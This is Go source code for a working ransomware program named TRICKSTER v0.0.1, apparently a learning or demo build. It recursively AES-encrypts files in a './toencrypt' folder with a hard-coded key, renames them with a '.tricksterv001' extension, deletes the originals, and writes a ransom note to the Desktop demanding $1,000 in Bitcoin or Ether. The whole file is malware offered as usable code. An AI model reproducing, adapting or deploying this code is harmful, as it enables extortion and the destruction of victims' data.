package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"flag"
	"fmt"
	"io"
	"strings"

	"io/fs"
	"io/ioutil"
	"log"
	"os"

	"golang.org/x/crypto/ssh/terminal"
)

const KeyStr string = "jdksieu38eueirktldoeiru38fjdlek3"

func AESEncrypt(text []byte) []byte {
	key := []byte(KeyStr)

	// generate a new aes cipher using our 32 byte long key
	c, err := aes.NewCipher(key)
	// if there are any errors, handle them
	if err != nil {
		fmt.Println(err)
	}

	// gcm or Galois/Counter Mode, is a mode of operation
	// for symmetric key cryptographic block ciphers
	// - https://en.wikipedia.org/wiki/Galois/Counter_Mode
	gcm, err := cipher.NewGCM(c)
	// if any error generating new GCM
	// handle them
	if err != nil {
		fmt.Println(err)
	}

	// creates a new byte array the size of the nonce
	// which must be passed to Seal
	nonce := make([]byte, gcm.NonceSize())
	// populates our nonce with a cryptographically secure
	// random sequence
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
	}

	// here we encrypt our text using the Seal function
	// Seal encrypts and authenticates plaintext, authenticates the
	// additional data and appends the result to dst, returning the updated
	// slice. The nonce must be NonceSize() bytes long and unique for all
	// time, for a given key.
	return gcm.Seal(nonce, nonce, []byte(text), nil)
}

func AESDecrypt(ciphertext []byte) []byte {
	key := []byte(KeyStr)

	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		fmt.Println(err)
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		fmt.Println(err)
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		fmt.Println(err)
	}

	return []byte(plaintext)
}

func TestEncryptDecrypt() {
	plaintext := "Hello world."

	fmt.Println("[Plaintext]", plaintext)

	cipher := AESEncrypt([]byte(plaintext))

	fmt.Println("[Encrypted]", string(cipher))

	decrypted := AESDecrypt(cipher)

	fmt.Println("[Decrypted]", string(decrypted))
}

func RecursiveEncrypt(
	index []int,
	dir string,
	file fs.FileInfo,
	decrypt bool,
) {
	for i := 0; i < len(index); i++ {
		fmt.Print("_")
	}
	fmt.Println(index)

	if file.IsDir() {
		for i := 0; i < len(index); i++ {
			fmt.Print("_")
		}
		fmt.Println("[DIR]", dir+"/"+file.Name())

		files, _ := ioutil.ReadDir(dir + "/" + file.Name())

		dirName := file.Name()

		for i, file := range files {
			newIndex := index
			newIndex = append(newIndex, i+1)

			RecursiveEncrypt(newIndex, dir+"/"+dirName, file, decrypt)
		}

		return
	}

	// Check if encrypt/decrypt

	// Encryption process
	if !decrypt {
		for i := 0; i < len(index); i++ {
			fmt.Print("_")
		}
		fmt.Println("[ENCRYPT FILE]", dir+"/"+file.Name())

		// Read file bytes
		fBytes, err := ioutil.ReadFile(dir + "/" + file.Name())

		if err != nil {
			for i := 0; i < len(index); i++ {
				fmt.Print("_")
			}
			fmt.Println("Error reading "+dir+"/"+file.Name(), ": ", err)
		}

		encryptedFileName := dir + "/" + file.Name() + ".tricksterv001"

		for i := 0; i < len(index); i++ {
			fmt.Print("_")
		}
		fmt.Println("Encrypted: " + encryptedFileName)

		ioutil.WriteFile(encryptedFileName, AESEncrypt(fBytes), 0644)

		// Delete original file
		os.Remove(dir + "/" + file.Name())

		// Decription process
	} else {
		for i := 0; i < len(index); i++ {
			fmt.Print("_")
		}
		fmt.Println("[DECRYPT FILE]", dir+"/"+file.Name())

		if !strings.Contains(file.Name(), ".tricksterv001") {
			fmt.Println("Failed to decrypt! file extension is not .tricksterv001")
		} else {
			// Read file bytes
			fBytes, err := ioutil.ReadFile(dir + "/" + file.Name())

			if err != nil {
				for i := 0; i < len(index); i++ {
					fmt.Print("_")
				}
				fmt.Println("Error reading "+dir+"/"+file.Name(), ": ", err)
			}

			originalFilename := strings.Split(file.Name(), ".tricksterv001")

			decryptedFileName := dir + "/" + originalFilename[0]

			for i := 0; i < len(index); i++ {
				fmt.Print("_")
			}
			fmt.Println("Decrypted: " + decryptedFileName)

			ioutil.WriteFile(decryptedFileName, AESDecrypt(fBytes), 0644)

			// Delete original file
			os.Remove(dir + "/" + file.Name())
		}
	}

	fmt.Println()
}

func main() {
	decryptFlag := flag.Bool("decrypt", false, "Define if type is decrypt")

	flag.Parse()

	// fmt.Println("Type:", *decryptFlag)

	decryptPassword := ""

	if *decryptFlag {
		fmt.Println("Please enter password:")

		pass, err := terminal.ReadPassword(0)

		if err != nil {
			fmt.Println("Failed reading password.")
		}

		decryptPassword = string(pass)
	}

	fmt.Println("pwd", decryptPassword)

	// TestEncryptDecrypt()

	test := `YOUR FILES HAVE BEEN ENCRYPTED!!
=========================================

The files in your computer has been infected with the TRICKSTER v0.0.1 ransomware!
To retrieve your files back, please pay with the amount of $1.000 to this crypto wallet:

BTC: IUR90EKJEKL2R90329993939420399324JRHHKSAF934
ETH: OOEPWR=2389FJIEWIOOOEO3920ROIE2PRE2==ER2IKF989

attach your email to the blockchain message, and we will contact you soon.

And then we will send the procedures to retrieve your files back.`

	fmt.Println("\nMessage:\n")
	fmt.Println(test)

	fmt.Println()

	fmt.Println("[FILES TO EN/DECRYPT]")

	dir := "./toencrypt"

	files, err := ioutil.ReadDir(dir)

	if err != nil {
		log.Fatal(err)
	}

	if *decryptFlag && KeyStr != decryptPassword {
		fmt.Println("Passwords do not match. Decrypt failed.")
		return
	}

	for i, file := range files {
		RecursiveEncrypt([]int{i + 1}, dir, file, *decryptFlag)
	}

	homeDir, _ := os.UserHomeDir()

	fmt.Println("[homedir]", homeDir)
	fmt.Println("[Desktop]", homeDir+"/Desktop")

	ioutil.WriteFile(homeDir+"/Desktop/ENCRYPTED!!! READ THIS!!", []byte(test), 0644)
}
